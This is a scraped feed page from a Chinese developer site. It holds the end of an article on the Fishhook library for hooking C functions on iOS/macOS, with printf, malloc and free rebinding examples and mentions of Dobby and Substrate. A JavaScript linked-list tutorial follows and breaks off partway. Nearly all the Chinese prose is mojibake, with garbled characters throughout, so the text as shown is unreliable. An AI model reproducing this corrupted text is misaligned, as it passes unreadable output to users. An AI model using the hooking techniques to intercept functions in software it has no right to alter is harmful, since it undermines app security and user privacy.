<table><thead><tr><th>å‡½æ•°ç±»å‹</th><th>æ˜¯å¦æ”¯æŒ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Cå‡½æ•°ï¼ˆåŠ¨æ€åº“ï¼‰</td><td>âœ… å®Œå…¨æ”¯æŒ</td><td>Fishhookçš„ä¸»è¦ç›®æ ‡</td></tr><tr><td>Objective-Cæ–¹æ³•</td><td>âŒ ä¸æ”¯æŒ</td><td>ä½¿ç”¨Method Swizzling</td></tr><tr><td>Swiftå‡½æ•°ï¼ˆ@_cdeclï¼‰</td><td>âœ… æ¡ä»¶æ”¯æŒ</td><td>éœ€è¦Cæ¥å£å¯¼å‡º</td></tr><tr><td>é™æ€é“¾æ¥å‡½æ•°</td><td>âŒ ä¸æ”¯æŒ</td><td>ç¼–è¯‘æ—¶ç›´æ¥é“¾æ¥</td></tr><tr><td>å†…è”å‡½æ•°</td><td>âŒ ä¸æ”¯æŒ</td><td>ç¼–è¯‘æ—¶å±•å¼€</td></tr></tbody></table>
<h3 data-id="heading-19">2. iOSä¸Šçš„ç‰¹æ®Šé™åˆ¶</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// åœ¨éè¶Šç‹±iOSè®¾å¤‡ä¸Šï¼š
// âœ… å¯ä»¥Hookè‡ªå·±çš„å‡½æ•°å’Œç³»ç»Ÿå…¬å¼€API
// âŒ ä¸èƒ½Hookç³»ç»Ÿç§æœ‰å‡½æ•°ï¼ˆå—ä»£ç ç­¾åä¿æŠ¤ï¼‰

// åœ¨è¶Šç‹±iOSè®¾å¤‡ä¸Šï¼š
// âœ… å¯ä»¥Hookæ‰€æœ‰å‡½æ•°

// éªŒè¯æ–¹æ³•ï¼š
#include &lt;fishhook.h&gt;
#include &lt;stdio.h&gt;

// å¯ä»¥Hookçš„ç³»ç»Ÿå…¬å¼€å‡½æ•°
static int (*original_printf)(const char *, ...);

int hooked_printf(const char *format, ...) {
    // Hookå®ç°
    return original_printf("[HOOKED] %s", format);
}

__attribute__((constructor))
static void setup_hook() {
    struct rebinding rebind = {"printf", hooked_printf, (void**)&amp;original_printf};
    rebind_symbols(&amp;rebind, 1);
}
</code></pre>
<h3 data-id="heading-20">3. è‡ªå®šä¹‰åŠ¨æ€åº“çš„Hook</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// MyDynamicFramework.framework
__attribute__((visibility("default")))
void framework_function() {
    NSLog(@"Original framework function");
}

// ä¸»å·¥ç¨‹ä¸­çš„Hook
static void (*original_framework_func)() = NULL;

void hooked_framework_func() {
    NSLog(@"Before framework function");
    original_framework_func();
    NSLog(@"After framework function");
}

// å®‰è£…Hook
struct rebinding rebind = {
    "framework_function",
    hooked_framework_func,
    (void**)&amp;original_framework_func
};
rebind_symbols(&amp;rebind, 1);
</code></pre>
<h2 data-id="heading-21">å…­ã€ä¸Method Swizzlingçš„å¯¹æ¯”</h2>
<h3 data-id="heading-22">1. Fishhookï¼ˆCå‡½æ•°Hookï¼‰</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// é€‚ç”¨äºCå‡½æ•°</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">hook_c_function</span><span class="hljs-params">()</span> {
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rebinding</span> <span class="hljs-title">rebind</span> =</span> {<span class="hljs-string">"printf"</span>, hooked_printf, &amp;original_printf};
    rebind_symbols(&amp;rebind, <span class="hljs-number">1</span>);
}
</code></pre>
<h3 data-id="heading-23">2. Method Swizzlingï¼ˆObjective-Cæ–¹æ³•Hookï¼‰</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// é€‚ç”¨äºObjective-Cæ–¹æ³•
+ (void)hookObjectiveCMethod {
    Method original = class_getInstanceMethod([UIView class], @selector(setBackgroundColor:));
    Method swizzled = class_getInstanceMethod([self class], @selector(hooked_setBackgroundColor:));
    method_exchangeImplementations(original, swizzled);
}
</code></pre>
<h3 data-id="heading-24">3. é€‰æ‹©æŒ‡å—</h3>





























<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæŠ€æœ¯</th></tr></thead><tbody><tr><td>Hook Cç³»ç»Ÿå‡½æ•°</td><td>Fishhook</td></tr><tr><td>Hook Cè‡ªå®šä¹‰å‡½æ•°</td><td>Fishhook</td></tr><tr><td>Hook Objective-Cæ–¹æ³•</td><td>Method Swizzling</td></tr><tr><td>Hook Swiftæ–¹æ³•</td><td>Method Swizzlingï¼ˆé€šè¿‡@objcæš´éœ²ï¼‰</td></tr><tr><td>åº•å±‚ç³»ç»Ÿç›‘æ§</td><td>Fishhook</td></tr></tbody></table>
<h2 data-id="heading-25">ä¸ƒã€å®æˆ˜æ¡ˆä¾‹</h2>
<h3 data-id="heading-26">1. æ€§èƒ½ç›‘æ§</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// ç›‘æ§å†…å­˜åˆ†é…
static void *(*original_malloc)(size_t);
static void (*original_free)(void *);

void *hooked_malloc(size_t size) {
    void *ptr = original_malloc(size);
    
    // è®°å½•å¤§å†…å­˜åˆ†é…
    if (size &gt; 1024 * 1024) {
        printf("[MEMORY] Large malloc: %zu bytes\n", size);
    }
    
    return ptr;
}

void hooked_free(void *ptr) {
    // å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ å†…å­˜é‡Šæ”¾ç›‘æ§
    original_free(ptr);
}
</code></pre>
<h2 data-id="heading-27">å…«ã€å¸¸è§é—®é¢˜è§£ç­”</h2>
<h3 data-id="heading-28">Q1: Fishhookèƒ½Hooké™æ€åº“å‡½æ•°å—ï¼Ÿ</h3>
<p><strong>A:</strong> å–å†³äºé™æ€åº“çš„é“¾æ¥æ–¹å¼ï¼š</p>
<ul>
<li>å¦‚æœé™æ€åº“è¢«å®Œå…¨å¤åˆ¶åˆ°åŠ¨æ€åº“ä¸­ï¼Œå¯ä»¥Hook</li>
<li>å¦‚æœé™æ€åº“ä¿æŒå¤–éƒ¨å¼•ç”¨ï¼Œéœ€è¦åœ¨é“¾æ¥é™æ€åº“çš„åœ°æ–¹Hook</li>
<li>é™æ€åº“çš„ç§æœ‰å‡½æ•°ï¼ˆstaticï¼‰æ— æ³•Hook</li>
</ul>
<h3 data-id="heading-29">Q2: ä¸ºä»€ä¹ˆOCå’ŒSwiftæ–¹æ³•ä¸èƒ½ç”¨Fishhook Hookï¼Ÿ</h3>
<p><strong>A:</strong> Objective-Cå’ŒSwiftçš„æ–¹æ³•è°ƒç”¨æœºåˆ¶å®Œå…¨ä¸åŒï¼š</p>
<ul>
<li>Objective-Cä½¿ç”¨æ¶ˆæ¯å‘é€æœºåˆ¶ï¼ˆobjc_msgSendï¼‰</li>
<li>Swiftæœ‰è‡ªå·±çš„åˆ†å‘æœºåˆ¶ï¼ˆè™šå‡½æ•°è¡¨ã€ç›´æ¥è°ƒç”¨ç­‰ï¼‰</li>
<li>å®ƒä»¬ä¸é€šè¿‡ç¬¦å·ç»‘å®šè¡¨è°ƒç”¨ï¼Œå› æ­¤Fishhookæ— æ³•ä¿®æ”¹</li>
</ul>
<h3 data-id="heading-30">Q3: Hookçš„æ—¶æœºæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>A:</strong> Fishhookå¯ä»¥åœ¨è¿è¡Œæ—¶ä»»ä½•æ—¶é—´ç‚¹è¿›è¡ŒHookï¼Œä½†æœ€ä½³å®è·µæ˜¯ï¼š</p>
<pre><code class="hljs language-objective-c" lang="objective-c">// 1. ç¨‹åºå¯åŠ¨æ—¶ï¼ˆæ¨èï¼‰
__attribute__((constructor))
static void setup_hooks() {
    // åœ¨main()å‡½æ•°ä¹‹å‰æ‰§è¡Œ
}

// 2. è¿è¡Œæ—¶åŠ¨æ€Hook
void dynamic_hook() {
    // å¯ä»¥åœ¨éœ€è¦æ—¶åŠ¨æ€å®‰è£…æˆ–ç§»é™¤Hook
}

// 3. ä½¿ç”¨dispatch_onceä¿è¯åªHookä¸€æ¬¡
static dispatch_once_t onceToken;
dispatch_once(&amp;onceToken, ^{
    // å®‰è£…Hook
});
</code></pre>
<h3 data-id="heading-31">Q4: åœ¨MachOViewä¸­ä¸ºä»€ä¹ˆçœ‹ä¸åˆ°__nl_symbol_ptrï¼Ÿ</h3>
<p><strong>A:</strong> åœ¨ç°ä»£iOS/macOSç³»ç»Ÿä¸­ï¼š</p>
<ul>
<li><code>__nl_symbol_ptr</code>å·²è¢«<code>__got</code>ï¼ˆå…¨å±€åç§»è¡¨ï¼‰æ›¿ä»£</li>
<li>æ‰€æœ‰éœ€è¦ç«‹å³ç»‘å®šçš„ç¬¦å·ç°åœ¨éƒ½æ”¾åœ¨<code>__got</code>ä¸­</li>
<li>è¿™æ˜¯ä¸ºäº†æ›´å¥½çš„ä½ç½®æ— å…³ä»£ç æ”¯æŒå’Œæ€§èƒ½ä¼˜åŒ–</li>
</ul>
<h2 data-id="heading-32">ä¹ã€Fishhookçš„å±€é™æ€§</h2>
<h3 data-id="heading-33">1. æŠ€æœ¯é™åˆ¶</h3>
<ul>
<li>åªèƒ½Hooké€šè¿‡ç¬¦å·è¡¨è°ƒç”¨çš„å‡½æ•°</li>
<li>æ— æ³•Hookå†…è”å‡½æ•°å’Œé™æ€é“¾æ¥å‡½æ•°</li>
<li>å¯¹C++å‡½æ•°æ”¯æŒæœ‰é™ï¼ˆåç§°é‡æ•´é—®é¢˜ï¼‰</li>
<li>çº¿ç¨‹å®‰å…¨é—®é¢˜éœ€è¦å¼€å‘è€…è‡ªå·±å¤„ç†</li>
</ul>
<h3 data-id="heading-34">2. å¹³å°é™åˆ¶</h3>
<ul>
<li>iOSéè¶Šç‹±è®¾å¤‡å—é™è¾ƒå¤š</li>
<li>æŸäº›ç³»ç»Ÿå‡½æ•°å—ä»£ç ç­¾åä¿æŠ¤</li>
<li>ä¸åŒiOSç‰ˆæœ¬å¯èƒ½æœ‰è¡Œä¸ºå·®å¼‚</li>
</ul>
<h3 data-id="heading-35">3. æ€§èƒ½è€ƒè™‘</h3>
<ul>
<li>ç¬¬ä¸€æ¬¡Hookéœ€è¦éå†ç¬¦å·è¡¨ï¼Œæœ‰æ€§èƒ½å¼€é”€</li>
<li>é¢‘ç¹çš„åŠ¨æ€Hook/Unhookå¯èƒ½å½±å“æ€§èƒ½</li>
<li>éœ€è¦è€ƒè™‘å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„å®‰å…¨æ€§</li>
</ul>
<h2 data-id="heading-36">åã€æœªæ¥å±•æœ›</h2>
<h3 data-id="heading-37">1. æ›¿ä»£æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// 1. Dobbyï¼ˆåŸDobbyHookï¼‰
// æ”¯æŒinline hookï¼Œæ›´å¼ºå¤§
#include &lt;dobby.h&gt;
DobbyHook((void *)printf, (void *)hooked_printf, (void **)&amp;original_printf);

// 2. substrateï¼ˆè¶Šç‹±è®¾å¤‡ï¼‰
// iOSè¶Šç‹±ç¯å¢ƒä¸‹çš„å®Œæ•´Hookæ¡†æ¶
MSHookFunction((void *)printf, (void *)hooked_printf, (void **)&amp;original_printf);
</code></pre>
<h3 data-id="heading-38">2. å‘å±•è¶‹åŠ¿</h3>
<ul>
<li>Appleæ­£åœ¨åŠ å¼ºç³»ç»Ÿå®‰å…¨æ€§</li>
<li>é™æ€åˆ†æå’Œè¿è¡Œæ—¶ä¿æŠ¤æœºåˆ¶å¢å¼º</li>
<li>å¯¹åŠ¨æ€ä»£ç ä¿®æ”¹çš„é™åˆ¶å¯èƒ½å¢åŠ </li>
<li>å¼€å‘è€…éœ€è¦æ›´å¤šå…³æ³¨å®˜æ–¹æä¾›çš„è°ƒè¯•å’Œç›‘æ§API</li>
</ul>
<h2 data-id="heading-39">ç»“è¯­</h2>
<p>Fishhooké€šè¿‡ç²¾å·§åœ°åˆ©ç”¨Mach-Oæ–‡ä»¶çš„åŠ¨æ€é“¾æ¥æœºåˆ¶ï¼Œå®ç°äº†è½»é‡çº§çš„å‡½æ•°HookåŠŸèƒ½ã€‚è™½ç„¶å®ƒæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œä½†ä»ç„¶æ˜¯ç†è§£macOS/iOSç³»ç»Ÿåº•å±‚æœºåˆ¶çš„ç»ä½³æ¡ˆä¾‹ï¼Œä¹Ÿæ˜¯è®¸å¤šè°ƒè¯•å’Œç›‘æ§å·¥å…·çš„åŸºç¡€ã€‚</p>
<p>é€šè¿‡æœ¬æ–‡çš„è¯¦ç»†è§£æï¼Œæˆ‘ä»¬å¸Œæœ›è¯»è€…èƒ½å¤Ÿï¼š</p>
<ol>
<li>æ·±å…¥ç†è§£Mach-Oæ–‡ä»¶ç»“æ„å’ŒåŠ¨æ€é“¾æ¥æœºåˆ¶</li>
<li>æŒæ¡Fishhookçš„å·¥ä½œåŸç†å’Œä½¿ç”¨æ–¹æ³•</li>
<li>äº†è§£ä¸åŒHookæŠ€æœ¯çš„é€‚ç”¨åœºæ™¯</li>
<li>åœ¨å®é™…å¼€å‘ä¸­æ­£ç¡®åº”ç”¨HookæŠ€æœ¯</li>
</ol>
<p>è®°ä½ï¼Œå¼ºå¤§çš„å·¥å…·ä¹Ÿæ„å‘³ç€é‡å¤§çš„è´£ä»»ã€‚HookæŠ€æœ¯åº”è¯¥ç”¨äºæ­£å½“çš„è°ƒè¯•ã€ç›‘æ§å’Œä¼˜åŒ–ç›®çš„ï¼Œè€Œä¸æ˜¯ç ´åç³»ç»Ÿå®‰å…¨æˆ–ä¾µçŠ¯ç”¨æˆ·éšç§ã€‚</p>
<hr/>
<p><strong>å‚è€ƒèµ„æºï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Ffishhook" target="_blank" title="https://github.com/facebook/fishhook" ref="nofollow noopener noreferrer">Fishhook GitHubä»“åº“</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Farchive%2Fdocumentation%2FPerformance%2FConceptual%2FCodeFootprint%2FArticles%2FMachOOverview.html" target="_blank" title="https://developer.apple.com/library/archive/documentation/Performance/Conceptual/CodeFootprint/Articles/MachOOverview.html" ref="nofollow noopener noreferrer">Apple Mach-Oæ–‡ä»¶æ ¼å¼æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopensource.apple.com%2Fsource%2Fdyld%2F" target="_blank" title="https://opensource.apple.com/source/dyld/" ref="nofollow noopener noreferrer">dyldæºç åˆ†æ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fbook.douban.com%2Fsubject%2F30227889%2F" target="_blank" title="https://book.douban.com/subject/30227889/" ref="nofollow noopener noreferrer">iOSé€†å‘å·¥ç¨‹ï¼šåŸç†ä¸å®è·µ</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹æŠŠæ‰‹å®ç°é“¾è¡¨ï¼šå•é“¾è¡¨ä¸åŒé“¾è¡¨çš„å®Œæ•´å®ç°]]></title>    <link>https://juejin.cn/post/7597619377430200374</link>    <guid>https://juejin.cn/post/7597619377430200374</guid>    <pubDate>2026-01-21T10:26:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597619377430200374" data-draft-id="7597596202025238570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹æŠŠæ‰‹å®ç°é“¾è¡¨ï¼šå•é“¾è¡¨ä¸åŒé“¾è¡¨çš„å®Œæ•´å®ç°"/> <meta itemprop="keywords" content="åç«¯,JavaScript,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-21T10:26:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢œé…±"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹æŠŠæ‰‹å®ç°é“¾è¡¨ï¼šå•é“¾è¡¨ä¸åŒé“¾è¡¨çš„å®Œæ•´å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢œé…±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:26:37.000Z" title="Wed Jan 21 2026 10:26:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ‰‹æŠŠæ‰‹å®ç°é“¾è¡¨ï¼šå•é“¾è¡¨ä¸åŒé“¾è¡¨çš„å®Œæ•´å®ç°</h2>
<p>é“¾è¡¨æ˜¯æ•°æ®ç»“æ„çš„åŸºç¡€ï¼Œä¹Ÿæ˜¯é¢è¯•é«˜é¢‘è€ƒç‚¹ã€‚å¾ˆå¤šåˆå­¦è€…ä¼šå¡åœ¨â€œæŒ‡é’ˆæ“ä½œæ··ä¹±â€â€œè¾¹ç•Œæ¡ä»¶å¤„ç†ä¸å½“â€ç­‰é—®é¢˜ä¸Šã€‚æœ¬æ–‡å°†ä»<strong>è®¾è®¡æ€è·¯</strong>å‡ºå‘ï¼Œæ‹†è§£å•é“¾è¡¨å®ç°çš„æ ¸å¿ƒé€»è¾‘ï¼ŒåŒæ—¶è¡¥å……åŒå‘é“¾è¡¨ï¼ˆåŒé“¾è¡¨ï¼‰çš„å®ç°æ–¹æ³•ï¼Œå¸®ä½ å½»åº•æŒæ¡é“¾è¡¨çš„å®ç°æŠ€å·§ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦æ‰‹åŠ¨å®ç°é“¾è¡¨ï¼Ÿ</h3>
<p>ç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚JavaScriptï¼‰æ²¡æœ‰å†…ç½®é“¾è¡¨ç»“æ„ï¼Œä½†é“¾è¡¨çš„â€œåŠ¨æ€æ‰©å®¹â€â€œéè¿ç»­å­˜å‚¨â€ç‰¹æ€§ä½¿å…¶åœ¨æ’å…¥/åˆ é™¤æ“ä½œä¸­æ¯”æ•°ç»„æ›´é«˜æ•ˆï¼ˆå°¤å…¶æ˜¯å¤´éƒ¨/ä¸­éƒ¨æ“ä½œï¼‰ã€‚æ‰‹åŠ¨å®ç°é“¾è¡¨çš„æ ¸å¿ƒç›®æ ‡æ˜¯ï¼š</p>
<ul>
<li>
<p>æŒæ¡<strong>æŒ‡é’ˆï¼ˆå¼•ç”¨ï¼‰æ“ä½œ</strong>çš„æ ¸å¿ƒé€»è¾‘ï¼›</p>
</li>
<li>
<p>ç†è§£<strong>è™šæ‹Ÿå¤´/å°¾èŠ‚ç‚¹</strong>ç­‰æŠ€å·§è§£å†³è¾¹ç•Œé—®é¢˜ï¼›</p>
</li>
<li>
<p>è§„é¿â€œç©ºæŒ‡é’ˆæ“ä½œâ€â€œçŠ¶æ€ä¸åŒæ­¥â€ç­‰é«˜é¢‘æŠ¥é”™ï¼›</p>
</li>
<li>
<p>åŒºåˆ†å•é“¾è¡¨ä¸åŒé“¾è¡¨çš„è®¾è®¡å·®å¼‚ï¼Œé€‚é…ä¸åŒåœºæ™¯éœ€æ±‚ã€‚</p>
</li>
</ul>
<h3 data-id="heading-2">äºŒã€å•é“¾è¡¨å®ç°</h3>
<h4 data-id="heading-3">1. å•é“¾è¡¨æ ¸å¿ƒè®¾è®¡æ€è·¯</h4>
<p>é“¾è¡¨çš„æœ€å°å•å…ƒæ˜¯â€œèŠ‚ç‚¹ï¼ˆNodeï¼‰â€ï¼Œæ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä¸¤éƒ¨åˆ†ï¼š</p>
<ul>
<li>
<p><code>val</code>ï¼šèŠ‚ç‚¹å­˜å‚¨çš„å€¼ï¼›</p>
</li>
<li>
<p><code>next</code>ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆï¼ˆå¼•ç”¨ï¼‰ï¼Œé»˜è®¤<code>null</code>ã€‚</p>
</li>
</ul>
<p>é“¾è¡¨ç±»ï¼ˆMyLinkedListï¼‰éœ€ç»´æŠ¤æ ¸å¿ƒå±æ€§ï¼Œä¸”éµå®ˆ<strong>çŠ¶æ€åŒæ­¥çº¦æŸ</strong>ï¼š</p>

























<table><thead><tr><th>å±æ€§å</th><th>ä½œç”¨</th><th>æ ¸å¿ƒçº¦æŸ</th></tr></thead><tbody><tr><td><code>dummyHead</code>ï¼ˆè™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼‰</td><td>ç»Ÿä¸€å¤´èŠ‚ç‚¹æ“ä½œé€»è¾‘ï¼Œé¿å…å•ç‹¬å¤„ç†å¤´èŠ‚ç‚¹</td><td>å§‹ç»ˆå­˜åœ¨ï¼Œ<code>next</code>æŒ‡å‘çœŸå®å¤´èŠ‚ç‚¹</td></tr><tr><td><code>tail</code>ï¼ˆå°¾èŠ‚ç‚¹ï¼‰</td><td>ä¼˜åŒ–å°¾æ’æ•ˆç‡ï¼ˆä»O(n)â†’O(1)ï¼‰</td><td><code>size=0</code>æ—¶<code>tail=null</code>ï¼›<code>size&gt;0</code>æ—¶<code>tail</code>æŒ‡å‘æœ€åä¸€ä¸ªèŠ‚ç‚¹</td></tr><tr><td><code>size</code>ï¼ˆé“¾è¡¨é•¿åº¦ï¼‰</td><td>ç®€åŒ–è¾¹ç•Œåˆ¤æ–­ï¼Œé¿å…å†—ä½™éå†</td><td>å¢/åˆ æ“ä½œå¿…é¡»åŒæ­¥æ›´æ–°ï¼Œä¸<code>tail</code>çŠ¶æ€ä¸¥æ ¼ä¸€è‡´</td></tr></tbody></table>
<h4 data-id="heading-4">å®ç°æ­¥éª¤ï¼ˆä»0å¼€å§‹è®¾è®¡ï¼‰</h4>
<p><strong>ç¬¬ä¸€æ­¥ï¼šå®šä¹‰èŠ‚ç‚¹ç±»</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;   <span class="hljs-comment">// èŠ‚ç‚¹å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
  }
}
</code></pre>
<p><strong>ç¬¬äºŒæ­¥ï¼šè®¾è®¡é“¾è¡¨ç±»ç»“æ„</strong></p>
<ol>
<li>åˆå§‹åŒ–è™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼ˆ<code>dummyHead</code>ï¼‰ï¼šç»Ÿä¸€å¤´èŠ‚ç‚¹æ“ä½œï¼Œé¿å…è¾¹ç•Œåˆ¤æ–­</li>
<li>åˆå§‹åŒ–å°¾èŠ‚ç‚¹ï¼ˆ<code>tail</code>ï¼‰ï¼šåˆå§‹ä¸º<code>null</code>ï¼Œç©ºé“¾è¡¨æ—¶æ— å°¾èŠ‚ç‚¹</li>
<li>åˆå§‹åŒ–é•¿åº¦ï¼ˆ<code>size</code>ï¼‰ï¼šåˆå§‹ä¸º<code>0</code>ï¼Œè®°å½•é“¾è¡¨èŠ‚ç‚¹æ•°é‡</li>
</ol>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šå®ç°åŸºç¡€æŸ¥è¯¢æ–¹æ³•</strong></p>
<ul>
